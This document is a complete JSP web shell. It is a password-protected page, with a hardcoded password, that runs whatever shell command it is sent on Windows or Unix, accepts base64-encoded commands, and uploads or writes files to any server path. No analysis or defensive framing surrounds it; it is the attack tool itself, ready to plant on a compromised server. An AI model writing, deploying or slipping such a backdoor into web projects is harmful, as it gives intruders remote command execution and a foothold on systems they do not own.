<%@ page import="java.util.*,java.io.*,java.net.*,sun.misc.BASE64Decoder"%>
<%
String pass = "protiviti101";
String cmd;
String[] cmdary;
String OS = System.getProperty("os.name");
String html_header = "<html>\n"
                   + "<body>\n"
                   + "Enter command:\n"
                   + "<form method=\"GET\" name=\"cmdform\" action=\"\">\n"
                   + "<input type=\"text\" width=\"50\" name=\"cmd\">\n"
                   + "<input type=\"hidden\" name=\"html\" value=\"true\">\n"
                   + "<input type=\"hidden\" name=\"pass\" value=\"" + URLEncoder.encode(pass) + "\">\n"
                   + "<input type=\"submit\" value=\"Run\">\n"
                   + "</form>\n"
                   + "<form method=\"POST\" name=\"fileform\" enctype=\"multipart/form-data\" action=\"\">\n"
                   + "Enter File to upload:<br />\n"
                   + "<input type=\"file\" name=\"uploadfile\"><br />\n"
                   + "Enter Path to save file:<br />\n"
                   + "<input type=\"text\" name=\"filepath\"><br />\n"
                   + "base64-decode file before saving:<br />\n"
                   + "<input type=\"checkbox\" name=\"b64\"><br />\n"
                   + "<input type=\"submit\" value=\"Upload\">\n"
                   + "</form>\n"
                   + "<pre>\n";
String html_footer = "</pre>\n"
                   + "</body>\n"
                   + "</html>\n";
if (request.getParameter("pass") != null) {
  if (URLDecoder.decode(request.getParameter("pass")).equals(pass)) {
    if (request.getParameter("html") != null) {
      out.println(html_header);
    }
    if (request.getParameter("cmd") != null) {
      if (request.getParameter("b64") != null) {
        BASE64Decoder decoder = new BASE64Decoder();
        cmd = new String (decoder.decodeBuffer(request.getParameter("cmd")));
      }
      else {
        cmd = new String (request.getParameter("cmd"));
      }
      if (OS.startsWith("Windows")) {
       cmdary = new String [] {"cmd", "/C", cmd};
      }
      else {
       cmdary = new String [] {"/bin/sh", "-c", cmd};
      }
      Process p = Runtime.getRuntime().exec(cmdary);
      OutputStream os = p.getOutputStream();
      InputStream in = p.getInputStream();
      DataInputStream dis = new DataInputStream(in);
      String disr = dis.readLine();
      while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
      }
    }
    String contentType = request.getContentType();
    if ((contentType != null) && (contentType.indexOf("multipart/form-data") >= 0)) {
      DataInputStream in = new DataInputStream(request.getInputStream());
      int formDataLength = request.getContentLength();
      byte dataBytes[] = new byte[formDataLength];
      int byteRead = 0;
      int totalBytesRead = 0;
      while (totalBytesRead < formDataLength) {
        byteRead = in.read(dataBytes, totalBytesRead, formDataLength);
        totalBytesRead += byteRead;
        }
      String formdata = new String(dataBytes);
      String boundary = formdata.substring(0,formdata.indexOf("\n", 0) - 1);
      String content = "";
      int bpos = -1;
      int cdl = -1;
      int cdle = -1;
      String cdll;
      int ctls = -1;
      int ctle = -1;
      String cttl;
      int pfs = -1;
      int pfse = -1;
      int pss = -1;
      int psse = -1;
      int endbpos = -1;
      String filename = "";
      String filepath = "";
      String file = "";
      String name = "";
      String b64 = "";
      bpos = formdata.indexOf(boundary);
      do {
        if (bpos < formdata.length()) {
          cdl= bpos+boundary.length()+2;
          cdle= formdata.indexOf("\n", bpos+boundary.length()+2)-1;
          cdll= formdata.substring(cdl, cdle);
          if (cdll.indexOf("Content-Disposition:")>=0) {
            pfs = cdll.indexOf("filename=\"");
            if (pfs >= 0) {
              pfs = pfs+10;
              pfse = cdll.indexOf('"', pfs);
              filename = cdll.substring(pfs, pfse);
              ctls= cdle+2;
              ctle= formdata.indexOf("\n", cdle+2)-1;
              cttl= formdata.substring(ctls, ctle);
              endbpos = formdata.indexOf(boundary, ctle+1)-1;
              file=formdata.substring(ctle+4,endbpos-1);
            } else {
              pss = cdll.indexOf("name=\"")+6;
              psse = cdll.indexOf('"', pss);
              name = cdll.substring(pss, psse);
              endbpos = formdata.indexOf(boundary, cdle+1)-2;
              content=formdata.substring(cdle+4,endbpos);
              if (name.equals("filepath")) {
                filepath=content;
              }
              if (name.equals("b64")) {
                b64=content;
              }
            }
          }
        }
        bpos = formdata.indexOf(boundary, bpos + boundary.length());
        if (bpos < 0) { bpos = formdata.length(); }
      } while (bpos + boundary.length() + 2 < formdata.length());
      if (! filename.equals("")) {
        if (filepath.equals("")) {
           filepath=filename;
        }
        FileOutputStream fileOut = new FileOutputStream(filepath);
        byte[] filebytes;
        if (! b64.equals("")) {
          BASE64Decoder decoder = new BASE64Decoder();
          filebytes = decoder.decodeBuffer(file);
        } else {
          filebytes = file.getBytes();
        }
        fileOut.write(file.getBytes());
        fileOut.flush();
        fileOut.close();
        out.println("wrote " + filepath);
      }
      }
    if (request.getParameter("html") != null) {
      out.println(html_footer);
    }
  }
}
%>
